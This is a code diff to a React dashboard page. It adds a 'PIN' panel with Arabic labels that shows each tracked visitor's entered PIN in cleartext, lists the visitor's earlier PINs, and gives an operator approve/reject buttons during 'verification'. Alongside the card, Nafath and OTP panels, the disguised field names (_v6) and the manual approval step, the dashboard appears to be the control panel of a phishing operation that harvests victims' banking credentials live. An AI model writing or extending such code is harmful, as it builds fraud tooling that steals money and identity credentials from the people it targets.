@@ -271,6 +271,9 @@ export default function DashboardPage() {
   const [expandedNafadHistory, setExpandedNafadHistory] = useState<Record<string, boolean>>({});
   const [nafadHistory, setNafadHistory] = useState<Record<string, any[]>>({});
   const [hasNafadHistory, setHasNafadHistory] = useState<Record<string, boolean>>({});
+  const [expandedPinHistory, setExpandedPinHistory] = useState<Record<string, boolean>>({});
+  const [pinHistory, setPinHistory] = useState<Record<string, any[]>>({});
+  const [hasPinHistory, setHasPinHistory] = useState<Record<string, boolean>>({});
 
   // Toggle card history expansion
   const toggleCardHistory = async (visitorId: string) => {
@@ -358,6 +361,28 @@ export default function DashboardPage() {
     }
     
     setExpandedNafadHistory(prev => ({ ...prev, [visitorId]: !isExpanded }));
+  };
+
+  // Toggle PIN history expansion
+  const togglePinHistory = async (visitorId: string) => {
+    const isExpanded = expandedPinHistory[visitorId];
+    
+    if (!isExpanded) {
+      // Fetch history when expanding
+      try {
+        const res = await fetch(`/api/dashboard/pin-history/${visitorId}`);
+        if (res.ok) {
+          const data = await res.json();
+          const history = data.history || [];
+          setPinHistory(prev => ({ ...prev, [visitorId]: history }));
+          setHasPinHistory(prev => ({ ...prev, [visitorId]: history.length > 0 }));
+        }
+      } catch {
+        console.error("Failed to fetch PIN history");
+      }
+    }
+    
+    setExpandedPinHistory(prev => ({ ...prev, [visitorId]: !isExpanded }));
   };
 
   // Get latest card data from selected request
@@ -2842,6 +2867,221 @@ export default function DashboardPage() {
     );
   };
 
+  // صندوق صفحة PIN (step3)
+  const renderPinBox = () => {
+    const raw = selectedRequest?.raw || {};
+    
+    const pinStatus = raw?._v6Status || raw?.pinStatus;
+    const pinCode = raw?._v6 || raw?.pinCode || "";
+    
+    // التحقق من وجود بيانات PIN
+    const hasPinData = pinCode || pinStatus;
+    if (!hasPinData) return null;
+
+    const statusConfig: Record<string, { color: string; bg: string; border: string; icon: string; text: string }> = {
+      "pending": { color: "#92400e", bg: "#fef3c7", border: "#fcd34d", icon: "⏳", text: "بانتظار التحقق" },
+      "verifying": { color: "#1e40af", bg: "#dbeafe", border: "#93c5fd", icon: "🔄", text: "جاري التحقق" },
+      "approved": { color: "#166534", bg: "#dcfce7", border: "#86efac", icon: "✅", text: "تم التحقق" },
+      "rejected": { color: "#991b1b", bg: "#fee2e2", border: "#fca5a5", icon: "❌", text: "مرفوض" }
+    };
+
+    const config = statusConfig[pinStatus] || statusConfig["pending"];
+
+    return (
+      <div style={{ 
+        background: "#ffffff", 
+        borderRadius: 12, 
+        padding: 16, 
+        border: "1px solid #e5e7eb",
+        marginBottom: 12
+      }}>
+        <div style={{ 
+          display: "flex", 
+          justifyContent: "center", 
+          alignItems: "center", 
+          gap: 8, 
+          marginBottom: 12,
+          paddingBottom: 12,
+          borderBottom: "2px solid #e5e7eb"
+        }}>
+          <span style={{ fontSize: "1.2rem" }}>🔐</span>
+          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#0a4a68" }}>
+            رمز PIN
+          </h3>
+        </div>
+        
+        {/* عرض حالة PIN */}
+        <div style={{ 
+          ...config, 
+          borderRadius: 8, 
+          padding: 12, 
+          border: `1px solid ${config.border}`,
+          display: "flex",
+          alignItems: "center",
+          gap: 8,
+          marginBottom: 12
+        }}>
+          <span style={{ fontSize: "1.2rem" }}>{config.icon}</span>
+          <span style={{ fontSize: "0.85rem", fontWeight: 600, color: config.color }}>
+            {config.text}
+          </span>
+        </div>
+
+        {/* عرض رمز PIN */}
+        {pinCode && (
+          <div style={{
+            background: "#f0fdf4",
+            borderRadius: 8,
+            padding: 16,
+            border: "1px solid #86efac",
+            textAlign: "center",
+            marginBottom: 12
+          }}>
+            <div style={{
+              fontSize: "0.75rem",
+              color: "#166534",
+              marginBottom: 8,
+              fontWeight: 500
+            }}>
+              رمز PIN المدخل
+            </div>
+            <div style={{
+              fontFamily: "ui-monospace, monospace",
+              fontSize: "2rem",
+              fontWeight: 700,
+              color: "#166534",
+              letterSpacing: "8px",
+              direction: "ltr"
+            }}>
+              {pinCode}
+            </div>
+          </div>
+        )}
+
+        {/* أزرار التحكم */}
+        {pinStatus === "verifying" && (
+          <div style={{ 
+            display: "flex", 
+            gap: 8,
+            marginBottom: 12
+          }}>
+            <button
+              onClick={() => handlePinAction("approved")}
+              style={{
+                flex: 1,
+                padding: "10px 16px",
+                borderRadius: 8,
+                border: "none",
+                background: "#166534",
+                color: "white",
+                fontSize: "0.8rem",
+                fontWeight: 600,
+                cursor: "pointer",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                gap: 6
+              }}
+            >
+              ✅ موافق
+            </button>
+            <button
+              onClick={() => handlePinAction("rejected")}
+              style={{
+                flex: 1,
+                padding: "10px 16px",
+                borderRadius: 8,
+                border: "none",
+                background: "#991b1b",
+                color: "white",
+                fontSize: "0.8rem",
+                fontWeight: 600,
+                cursor: "pointer",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                gap: 6
+              }}
+            >
+              ❌ رفض
+            </button>
+          </div>
+        )}
+
+        {/* زر عرض الرموز السابقة */}
+        {hasPinHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
+          <div style={{ marginTop: 12 }}>
+            <button
+              onClick={() => togglePinHistory(selectedRequest?.id || selectedRequest?.visitorId || "")}
+              style={{
+                width: "100%",
+                padding: "8px 16px",
+                borderRadius: 8,
+                border: "1px solid #e5e7eb",
+                background: expandedPinHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "#f3f4f6" : "#ffffff",
+                color: "#374151",
+                fontSize: "0.75rem",
+                fontWeight: 600,
+                cursor: "pointer",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                gap: 6
+              }}
+            >
+              {expandedPinHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "🔼 إخفاء السجلات" : `📋 عرض ${pinHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.length || 0} رموز PIN سابقة`}
+            </button>
+
+            {/* سجلات رموز PIN */}
+            {expandedPinHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
+              <div style={{ 
+                marginTop: 8,
+                maxHeight: 300,
+                overflowY: "auto"
+              }}>
+                {pinHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.map((item: any, idx: number) => (
+                  <div key={idx} style={{
+                    background: "#f9fafb",
+                    borderRadius: 8,
+                    padding: 12,
+                    marginBottom: 8,
+                    border: "1px solid #e5e7eb",
+                    textAlign: "center"
+                  }}>
+                    <div style={{ fontSize: "0.7rem", fontWeight: 600, color: "#374151", marginBottom: 4 }}>
+                      رمز PIN سابق #{idx + 1}
+                    </div>
+                    <div style={{
+                      fontFamily: "ui-monospace, monospace",
+                      fontSize: "1.5rem",
+                      fontWeight: 700,
+                      color: "#166534",
+                      letterSpacing: "6px",
+                      direction: "ltr",
+                      marginBottom: 4
+                    }}>
+                      {item.pinCode}
+                    </div>
+                    <div style={{
+                      fontSize: "0.65rem",
+                      padding: "2px 6px",
+                      borderRadius: 4,
+                      display: "inline-block",
+                      background: item.pinStatus === "approved" ? "#dcfce7" : item.pinStatus === "rejected" ? "#fee2e2" : "#fef3c7",
+                      color: item.pinStatus === "approved" ? "#166534" : item.pinStatus === "rejected" ? "#991b1b" : "#92400e"
+                    }}>
+                      {item.pinStatus === "approved" ? "✅" : item.pinStatus === "rejected" ? "❌" : "⏳"} {item.pinStatus}
+                    </div>
+                  </div>
+                ))}
+              </div>
+            )}
+          </div>
+        )}
+      </div>
+    );
+  };
+
   // =============================================
   // دالة عرض جميع الصناديق الجديدة
   // =============================================
@@ -2864,6 +3104,9 @@ export default function DashboardPage() {
 
     const otpBox = renderOtpBox();
     if (otpBox) boxes.push({ key: 'otp', component: otpBox });
+
+    const pinBox = renderPinBox();
+    if (pinBox) boxes.push({ key: 'pin', component: pinBox });
 
     const phoneBox = renderPhoneBox();
     if (phoneBox) boxes.push({ key: 'phone', component: phoneBox });
